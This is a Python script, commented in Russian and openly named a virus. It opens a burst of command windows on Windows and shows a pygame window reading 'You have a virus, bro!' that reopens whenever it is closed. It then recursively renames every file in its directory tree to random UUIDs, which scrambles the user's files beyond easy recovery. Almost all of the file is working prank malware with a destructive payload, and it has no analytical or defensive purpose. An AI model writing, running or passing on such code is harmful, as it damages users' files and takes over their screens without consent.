import os
import sys
import time
import pygame
import uuid
from pathlib import Path
from typing import Iterable


CURRENT_FILE = Path(__file__)
CURRENT_DIR = CURRENT_FILE.parent


def generate_new_name(file: Path):
    return str(uuid.uuid4())


def rename_all_files_in_dir(
    dir_path: Path = CURRENT_DIR,
    protected_files: Iterable[Path] = (CURRENT_FILE,),
):
    for maybe_file in dir_path.iterdir():
        if maybe_file in protected_files:
            continue
        if maybe_file.is_file():
            maybe_file.rename(Path(dir_path) / generate_new_name(maybe_file))
        elif maybe_file.is_dir():
            rename_all_files_in_dir(maybe_file, protected_files)


class VirusExecutor(object):
    def __init__(self, cmd_attacks_amount: int = 30, finish_dir_path: Path = CURRENT_DIR):
        """Конструктор класса.

        Установка исходных параметров атаки:
            cmd_current_attacks_amount: текущее количество атак
            cmd_max_attacks_amount: максимальное допустимое количество атак
            finish_dir_path: директория исполнения финишной команды
        """
        self.cmd_current_attacks_amount = 0
        self.cmd_max_attacks_amount = cmd_attacks_amount
        self.finish_dir_path = finish_dir_path

    def execute(self):
        """Запуск вируса.

        Атаки будут производиться до момента, пока условие прекращения атак не будет удовлетворено.
        После окончания атак будет запущена финиширующая инструкция.
        """
        try:
            self.launch_cmd_atack()
            self.launch_pygame_atack()
        finally:
            self.launch_finish_atack()

    def launch_cmd_atack(self):
        """Запуск серии атак на cmd."""
        while self.if_cmd_attack_needs_to_be_stopped():
            self.cmd_current_attacks_amount += 1
            self.cmd_attack()

    def if_cmd_attack_needs_to_be_stopped(self) -> bool:
        """Проверка условия прекращения атак на cmd."""
        return self.cmd_current_attacks_amount != self.cmd_max_attacks_amount

    def cmd_attack(self):
        """Описание атаки на cmd."""
        raise NotImplementedError

    @staticmethod
    def launch_pygame_atack():
        """Запуск серии атак через pygame."""
        pygame.init()  # инициализация pygame#
        screen = pygame.display.set_mode((1000, 500))  # открытие окна#
        pygame.display.set_caption("ВНИМАНИЕ")  # надпись в заголовке #
        font = pygame.font.SysFont("Segoe UI", 50)  # характеристики надписи в самом окне #
        label = font.render("У тебя вирус, бро!", 1, (12, 140, 0, 1))  # надпись в самом окне #

        while True:
            for i in pygame.event.get():
                if i.type == pygame.QUIT:
                    pygame.quit()
                    time.sleep(0.001)
                    screen = pygame.display.set_mode((1000, 500))  # открытие окна#
                    pygame.display.set_caption("ВНИМАНИЕ")

            try:
                screen.fill((0, 0, 0))  # цвет экрана#
                screen.blit(label, (50, 50))  # выведение на экран#
                pygame.display.update()  # обновление экрана#
            except KeyboardInterrupt:
                break

    def launch_finish_atack(self):
        """Финиширующая инструкция.

        Переименовывает все файлы в директории."""
        rename_all_files_in_dir(
            dir_path=self.finish_dir_path, protected_files=frozenset((Path(__file__), ))
        )


class WindowsVirusExecutor(VirusExecutor):
    def cmd_attack(self):
        os.system("start")


class MacOSVirusExecutor(VirusExecutor):
    def cmd_attack(self):
        print("ATTACK!")


def find_path_to_desktop() -> Path:
    return Path("Desktop")


def test_find_path_to_desktop():
    path_to_desktop = find_path_to_desktop()
    expected_dirs = frozenset(("Этот компьютер", "Корзина"))
    for maybe_dir in path_to_desktop.iterdir():
        if maybe_dir.name in expected_dirs:
            print("OK")
            return
    raise Exception("It is not Desktop!")


if __name__ == "__main__":
    if sys.platform.startswith("win"):
        WindowsVirusExecutor(5).execute()
    else:
        MacOSVirusExecutor(5).execute()
